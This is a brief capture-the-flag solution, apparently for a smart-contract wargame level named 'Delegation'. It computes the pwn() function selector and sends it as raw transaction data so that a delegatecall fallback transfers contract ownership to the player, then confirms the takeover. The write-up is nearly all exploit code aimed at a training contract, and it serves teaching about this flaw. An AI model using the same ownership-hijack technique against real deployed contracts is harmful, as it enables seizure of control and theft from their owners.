# Delegation solution

1. Calculate function `pwn()` signature  
`web3.sha3("pwn()").substring(0, 10)`  
"0xdd365b8b"

2. Invoke function to transfer ownership
```
await contract.sendTransaction({
  from: player,
  data: "0xdd365b8b"
})
```

3. Check contract owner  
`player === await contract.owner()`  
true  

4. Submit Instance 🎉
